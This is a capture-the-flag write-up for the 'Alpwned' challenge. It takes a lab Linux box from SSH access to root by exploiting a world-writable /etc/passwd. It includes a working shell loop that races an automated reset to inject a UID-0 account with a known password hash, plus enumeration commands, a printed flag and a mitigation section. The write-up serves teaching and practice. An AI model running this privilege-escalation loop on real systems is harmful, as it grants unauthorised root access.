# Alpwned – CTF Writeup




{{< admonition tldr "TL;DR" >}}

**Alpwned – CTF Writeup** is a pwn challenge from **HackerDNA**. **Challenge Name:** Alpwned **Category:** Web / Privilege Escalation **Difficulty:** Medium **Environment:** Linux (BusyBox based system)

{{< /admonition >}}

## Overview

**Challenge Name:** Alpwned  
**Category:** Web / Privilege Escalation  
**Difficulty:** Medium  
**Environment:** Linux (BusyBox based system)

This challenge demonstrates a full attack chain starting from web exploitation, gaining initial system access via SSH, and ultimately achieving root privileges through a misconfigured system file combined with a race condition.

The key vulnerability lies in the improper permissions of the `/etc/passwd` file, which is world-writable but protected by an automated reset mechanism. By exploiting a race condition against this reset process, it is possible to escalate privileges and retrieve the root flag.

---

# 1. Initial Access

After exploiting the web application vulnerability (e.g., SQL Injection in the authentication system), administrative access to the panel was obtained.

Within the administrative interface, sensitive information was exposed, including SSH credentials for the system.

Using these credentials, SSH access was established:

```bash
ssh ctf@<target-ip>
```
After authentication, the user shell was obtained.

---

# 2. User Enumeration

After logging in, the user flag was located in the home directory:

```bash
ls
cat flag-user.txt
```

Example output:

```
5cb66b4a-5e82-4687-6b20-567ecb42f69a
```

Next, privilege escalation vectors were investigated.

---

# 3. Privilege Escalation Enumeration

The first step was checking for common privilege escalation vectors such as SUID binaries:

```bash
find / -perm -4000 -type f 2>/dev/null
```

Output included typical system binaries such as:

```
/usr/bin/passwd
/usr/bin/sudo
/bin/busybox
```

No immediately exploitable SUID binaries were identified.

Next, the permissions of critical system files were inspected.

---

#4. Discovery of Misconfigured `/etc/passwd` The permissions of `/etc/passwd` revealed a critical misconfiguration:

```bash
ls -l /etc/passwd
```

Output:

```
-rw-rw-rw- 1 root root 737 Mar 13 11:39 /etc/passwd
```

This indicates that the file is **world-writable**, allowing any user on the system to modify it.

Normally, this would allow the attacker to add a new user with UID 0 (root privileges).

---

# 5. Attempted `/etc/passwd` Modification

A modified passwd file was created:

```bash
cp /etc/passwd /tmp/passwd
```

A new root user was added:

```
pwnroot:$5$pZ66Upgowa.ADkU6$S4WCEyPzXoehhBV9Ro2fR6sgJj8raKzzQakkuvcwcv.:0:0:root:/root:/bin/sh
```

The password hash corresponds to the password:

```
pwned
```

However, replacing `/etc/passwd` revealed an unexpected behavior:

```bash
cat /tmp/passwd > /etc/passwd
```

The modification did not persist.

This indicated that the file was being **automatically restored**, likely by a scheduled task or monitoring process.

---

# 6. Identifying a Race Condition

The challenge hint suggests the following scenario:

> *"What if the file resets on a timer? How would you write a script that wins a race against that reset?"*

This strongly implied a **race condition vulnerability**.

The strategy is to continuously overwrite `/etc/passwd` faster than the automated reset process.

If successful, the system will temporarily accept the modified file, allowing authentication as the newly created root user.

---

# 7. Exploiting the Race Condition

First, ensure the modified passwd file exists:

```bash
cat /tmp/passwd
```

Then execute the following race condition exploit:

```bash
while true; do
cat /tmp/passwd > /etc/passwd
echo pwned | su pwnroot -c "cat /root/flag-root.txt"
done
```

This loops repeatedly:

1. Overwrite `/etc/passwd` 2. Attempts authentication as the injected root user
3. Execute the command to retrieve the root flag

Eventually the race condition succeeds.

---

# 8. Root Flag

Once the race condition is won, the root flag is revealed:

```bash
cat /root/flag-root.txt
```

Example output:

```
<root-flag>
```

---

# 9. Root Cause

The vulnerability is caused by two critical security flaws:

1. **World-written `/etc/passwd` **
2. **Improper file restoration mechanism**

Although the system attempts to protect the file by resetting it, the implementation introduces a **Time-of-Check to Time-of-Use (TOCTOU) race condition**, allowing attackers to overwrite the file between resets.

---

# 10. Mitigation

To prevent this vulnerability:

1. Correct file permissions:

```bash
chmod 644 /etc/passwd
```

2. Avoid insecure automated file resets.

3. Implement proper privilege separation.

4. Monitor unauthorized modifications to critical system files.

---

# Conclusion

This challenge demonstrates how a seemingly protected system can still be vulnerable due to improper file permissions and flawed remediation mechanisms.

By exploiting a race condition against an automated file reset, it was possible to inject a root-level account and retrieve the root flag.

This attack highlights the importance of proper file permissions and secure system hardening.


---

> Author: [spawn2pwn](https://github.com/nfl-alvis)  
> URL: https://ctf.spawn2pwn.my.id/posts/alpwned/  

